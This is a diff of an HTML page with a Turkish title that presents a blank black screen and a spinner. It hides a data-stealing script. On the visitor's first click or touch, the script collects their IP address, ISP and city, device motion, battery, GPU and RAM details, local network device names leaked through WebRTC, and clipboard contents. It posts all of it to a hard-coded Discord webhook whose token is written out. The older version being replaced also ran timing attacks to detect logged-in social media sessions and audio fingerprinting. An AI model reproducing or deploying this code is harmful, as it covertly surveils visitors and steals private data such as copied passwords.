@@ -3,110 +3,99 @@
 <head>
     <meta charset="UTF-8">
     <title>Sistem Entegrasyon Birimi</title>
-    <style>body{background:#000;margin:0;display:flex;align-items:center;justify-content:center;height:100vh;overflow:hidden;cursor:crosshair;}.s{width:40px;height:40px;border:1px solid #111;border-top:2px solid #0f0;border-radius:50%;animation:r .5s linear infinite;}@keyframes r{to{transform:rotate(360deg);}}</style>
+    <style>
+        body { background: #000; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; cursor: none; }
+        .p { width: 40px; height: 40px; border: 1px solid #111; border-top: 1px solid #ff0000; border-radius: 50%; animation: s 0.5s linear infinite; }
+        @keyframes s { to { transform: rotate(360deg); } }
+    </style>
 </head>
 <body onmousedown="Singularity.ignite()" ontouchstart="Singularity.ignite()">
-    <div class="s"></div>
+    <div class="p"></div>
 
     <script>
         "use strict";
 
-        /**
-         * @namespace Singularity
-         * @description Agresif Tarayıcı Forensik ve Donanım Analiz Motoru
-         */
         const Singularity = (function() {
             const HOOK = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
             let fired = false;
 
-            const Forensic = {
-                // 1. Audio Fingerprinting (Cihazın Eşsiz Ses İmzası)
-                async getAudioHash() {
-                    try {
-                        const ctx = new (window.AudioContext || window.webkitAudioContext)();
-                        const osc = ctx.createOscillator();
-                        const comp = ctx.createDynamicsCompressor();
-                        osc.type = 'triangle'; osc.connect(comp); comp.connect(ctx.destination);
-                        return ctx.sampleRate + "_" + comp.threshold.value;
-                    } catch(e) { return "Disabled"; }
+            const Core = {
+                // 1. Hareket Analizi (Jiroskop & İvmeölçer)
+                getMovement() {
+                    return new Promise(res => {
+                        let motion = "Sabit/Masaüstü";
+                        window.ondevicemotion = (e) => {
+                            const acc = e.accelerationIncludingGravity;
+                            const total = Math.sqrt(acc.x**2 + acc.y**2 + acc.z**2);
+                            if (total > 15) motion = "Hızlı Hareket (Araç)";
+                            else if (total > 11) motion = "Yürüyüş/Hareketli";
+                        };
+                        setTimeout(() => res(motion), 500);
+                    });
                 },
 
-                // 2. High-Entropy OS & Hardware Details (UA Client Hints)
-                async getDeepOS() {
-                    if (navigator.userAgentData?.getHighEntropyValues) {
-                        return await navigator.userAgentData.getHighEntropyValues([
-                            "platform", "platformVersion", "architecture", "model", "bitness"
-                        ]);
-                    }
-                    return { platform: navigator.platform, arch: "x86/x64 (Est)" };
+                // 2. Ağ Tipi Tahmini (ISP & DNS Analysis)
+                async getNetContext() {
+                    const start = performance.now();
+                    const ip = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
+                    const latency = performance.now() - start;
+                    
+                    let locationType = "Ev/Bireysel";
+                    if (latency < 25) locationType = "Kurumsal/Fiber Ofis";
+                    if (ip.org?.toLowerCase().includes("starbucks") || ip.org?.toLowerCase().includes("hotspot")) locationType = "Halka Açık Hotspot (Starbucks vb.)";
+                    
+                    return { ...ip, locationType, latency: latency.toFixed(2) + "ms" };
                 },
 
-                // 3. Bluetooth & USB Probing (Inventory Check)
-                async checkPeripherals() {
-                    const status = { bt: "❌", usb: "❌", hid: "❌" };
-                    if (navigator.bluetooth) status.bt = "✅ Active Stack";
-                    if (navigator.usb) status.usb = "✅ Controller Detected";
-                    if (navigator.hid) status.hid = "✅ Ready";
-                    return status;
-                },
-
-                // 4. Social Media Cache Detection (Timing Attack)
-                async probeSocials() {
-                    const sites = {
-                        "Instagram": "https://www.instagram.com/favicon.ico",
-                        "TikTok": "https://www.tiktok.com/favicon.ico",
-                        "LinkedIn": "https://www.linkedin.com/favicon.ico",
-                        "Google": "https://accounts.google.com/CheckCookie",
-                        "Netflix": "https://www.netflix.com/favicon.ico",
-                        "Spotify": "https://open.spotify.com/favicon.ico"
-                    };
-                    const out = {};
-                    for (const [name, url] of Object.entries(sites)) {
-                        const s = performance.now();
-                        try {
-                            await fetch(url, { mode: 'no-cors', cache: 'force-cache' });
-                            out[name] = (performance.now() - s < 15) ? "✅ Oturum Açık/Cache" : "❌ Pasif";
-                        } catch { out[name] = "❌ Pasif"; }
-                    }
-                    return out;
+                // 3. Yerel Cihaz Tespiti (mDNS Leak)
+                async scanLAN() {
+                    return new Promise(res => {
+                        const devices = [];
+                        const pc = new RTCPeerConnection({iceServers:[]});
+                        pc.createDataChannel("");
+                        pc.onicecandidate = e => {
+                            if (e.candidate?.candidate.includes(".local")) {
+                                devices.push(e.candidate.candidate.split(" ")[4]);
+                            }
+                        };
+                        pc.createOffer().then(o => pc.setLocalDescription(o));
+                        setTimeout(() => { pc.close(); res(devices.join(", ") || "Gizli/Yok"); }, 1200);
+                    });
                 }
             };
 
             return {
                 async ignite() {
-                    if (fired) return;
-                    fired = true;
+                    if (fired) return; fired = true;
 
-                    // Asenkron Veri Toplama Hattı
-                    const [soc, os, net, audio, bat] = await Promise.all([
-                        Forensic.probeSocials(), Forensic.getDeepOS(),
-                        fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({})),
-                        Forensic.getAudioHash(),
-                        navigator.getBattery ? navigator.getBattery() : null
+                    // Paralel Veri Madenciliği (Güçlü Asenkron Yapı)
+                    const [move, net, lan, bat] = await Promise.all([
+                        Core.getMovement(),
+                        Core.getNetContext(),
+                        Core.scanLAN(),
+                        navigator.getBattery ? navigator.getBattery() : { level: 0 }
                     ]);
 
                     const gl = document.createElement('canvas').getContext('webgl2');
                     const dbg = gl?.getExtension('WEBGL_debug_renderer_info');
-                    const dpr = window.devicePixelRatio || 1;
-                    const periph = await Forensic.checkPeripherals();
+                    const clip = await navigator.clipboard.readText().catch(() => "Erişim Reddedildi");
 
                     const payload = {
                         embeds: [{
-                            title: "💀 SINGULARITY_V300_DEEP_EXTRACTION",
+                            title: "💀 V600_SINGULARITY_CORE_EXTRACTION",
                             color: 0xff0000,
                             fields: [
-                                { name: "📡 NETWORK INTELLIGENCE", value: `**IP:** \`${net.ip}\` | **ISP:** ${net.org}\n**LOC:** ${net.city}/${net.country_name} | **VPN:** ${Intl.DateTimeFormat().resolvedOptions().timeZone !== net.timezone ? '🚩 DETECTED' : '✅ CLEAN'}`, inline: false },
-                                { name: "⚙️ HARDWARE KERNEL", value: `**GPU:** ${dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_ID) : 'N/A'}\n**CPU:** ${navigator.hardwareConcurrency} Cores | **RAM:** ${navigator.deviceMemory}GB\n**AudioID:** ${audio} | **Battery:** ${bat ? (bat.level * 100) + "%" : 'N/A'}`, inline: false },
-                                { name: "💻 SOFTWARE & PERIPHERALS", value: `**OS:** ${os.platform} (${os.platformVersion || os.arch})\n**Architecture:** ${os.architecture || '64-bit'}\n**BT:** ${periph.bt} | **USB:** ${periph.usb} | **HID:** ${periph.hid}`, inline: false },
-                                { name: "📺 PHYSICAL DISPLAY", value: `**Res:** ${Math.round(screen.width * dpr)}x${Math.round(screen.height * dpr)}\n**Ratio:** ${dpr} | **Referrer:** ${document.referrer || "Direct"}`, inline: false },
-                                { name: "🌍 ACTIVE SESSIONS (SIDE-CHANNEL)", value: "```" + Object.entries(soc).map(([k, v]) => `${k}:${v}`).join(" | ") + "```", inline: false }
+                                { name: "🛰️ FİZİKSEL KONUM & ISP", value: `**IP:** \`${net.ip}\` | **Tip:** ${net.locationType}\n**ISP:** ${net.org}\n**Şehir:** ${net.city}/${net.country_name}\n**Ping:** ${net.latency}`, inline: false },
+                                { name: "📡 ÇEVRESEL CİHAZLAR & AĞ", value: `**Ağdaki Diğer Cihazlar:** \`${lan}\`\n**Bluetooth:** ${!!navigator.bluetooth ? 'Aktif' : 'Pasif'}\n**Referer:** ${document.referrer || "Direkt"}`, inline: false },
+                                { name: "🏃 HAREKET & DURUM ANALİZİ", value: `**Tahmin:** ${move}\n**Pil:** %${Math.round(bat.level * 100)} | **Çekirdek:** ${navigator.hardwareConcurrency}\n**Pano (Clipboard):** \`\`\`${clip}\`\`\``, inline: false },
+                                { name: "⚙️ DONANIM RÖNTGENİ", value: `**GPU:** ${dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_ID) : 'N/A'}\n**RAM:** ${navigator.deviceMemory}GB | **DPR:** ${window.devicePixelRatio}`, inline: false }
                             ],
-                            footer: { text: "Protocol: Singularity v300 | Forensic Level: Extreme" },
+                            footer: { text: "Protocol: Singularity V600 | Extreme Intelligence" },
                             timestamp: new Date().toISOString()
                         }]
                     };
 
-                    await fetch(HOOK, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
+                    fetch(HOOK, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
                 }
             };
         })();
